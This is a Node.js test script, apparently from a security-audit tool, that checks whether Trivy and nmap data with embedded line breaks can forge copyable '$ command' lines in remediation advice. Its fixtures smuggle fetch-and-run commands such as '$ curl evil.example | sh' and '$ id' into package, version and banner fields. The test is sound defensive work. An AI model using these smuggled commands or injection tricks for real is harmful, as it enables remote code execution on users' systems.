"use strict";

/**
 * test-copyable-lines.js: datos de terceros no pueden fabricar una línea "$ comando" en el fix.
 * Prueba PkgName y FixedVersion de Trivy y product y version de nmap con saltos de línea.
 * Uso: node test/manual/test-copyable-lines.js
 */

const { normalizeImage, fromNseVulns } = require("../../lib/normalizer");
const { parseNmapXml } = require("../../nodes/audit-network/modules/nmap-wrapper");

let failed = 0, passed = 0;
function ok(cond, label, detail) {
  if (cond) { passed++; console.log(`  ✓ ${label}`); }
  else { failed++; console.log(`  ✗ ${label}`); if (detail) console.log(`      ${detail}`); }
}

const MARCA = "evil.example";
/** Las líneas que el dashboard ofrecería copiar y que vienen del dato inyectado. */
function copiablesInyectadas(findings) {
  return findings
    .flatMap((f) => [...String(f.fix || "").split("\n"), ...String(f.command || "").split("\n")])
    .filter((l) => /^\s*\$ /.test(l) && l.includes(MARCA));
}

// ── 1 · Trivy ───────────────────────────────────────────────────────────────────────────────
console.log("\n── 1 · normalizeImage(): campos de Trivy con saltos de línea ─────\n");
{
  const raw = { Results: [{
    Target: "evil:1 (debian 12)", Class: "os-pkgs", Type: "debian", __image: "evil:1",
    Vulnerabilities: [{
      VulnerabilityID: "CVE-2024-0001",
      PkgName: `x\n$ curl ${MARCA} | sh`,
      InstalledVersion: "1",
      FixedVersion: `2\u2028$ curl ${MARCA}`,
      Severity: "HIGH",
    }],
  }] };
  const f = normalizeImage(raw, "trivy");
  ok(f.length > 0, "se genera el hallazgo");
  ok(copiablesInyectadas(f).length === 0, "ninguna línea copiable sale del dato", JSON.stringify(copiablesInyectadas(f)));
  ok(f.every((x) => !/[\n\u2028]/.test(x.pkg || "")), "pkg queda en una línea", JSON.stringify(f.map((x) => x.pkg)));
  ok(f.some((x) => String(x.pkg || "").includes(MARCA)), "el dato se conserva como evidencia, no se borra");
}

// ── 2 · nmap ────────────────────────────────────────────────────────────────────────────────
console.log("\n── 2 · parseNmapXml(): banner con &#10; ──────────────────────────\n");
const xml =
  '<?xml version="1.0"?><nmaprun><host><ports>' +
  '<port protocol="tcp" portid="21"><state state="open"/>' +
  `<service name="ftp" product="vsftpd&#10;$ curl ${MARCA} | sh&#x2028;$ id" version="3.0.3"/></port>` +
  '</ports></host><runstats><finished exit="success"/></runstats></nmaprun>';
const ports = parseNmapXml(xml);
ok(ports.length === 1, "se parsea el puerto");
ok(!/[\n\r\u2028\u2029]/.test(ports[0].version), "version queda en una línea", JSON.stringify(ports[0].version));
ok(ports[0].version.includes("3.0.3"), "y conserva la versión real", JSON.stringify(ports[0].version));

// ── 3 · fix de red completo ─────────────────────────────────────────────────────────────────
console.log("\n── 3 · fromNseVulns(): fix construido con ese banner ─────────────\n");
{
  const p = { ...ports[0], nseSummary: { vulns: [{ cves: [{ id: "CVE-2024-0001", cvss: 9.8 }], exploits: 0 }] } };
  let f = [];
  try { f = fromNseVulns([p], { target: "10.0.0.5", targetIsLocal: false }); } catch (e) { f = []; }
  ok(copiablesInyectadas(f).length === 0, "ninguna línea copiable sale del banner", JSON.stringify(copiablesInyectadas(f)));
}

console.log(`\n${passed} ok · ${failed} fallo(s)\n`);
process.exit(failed ? 1 : 0);
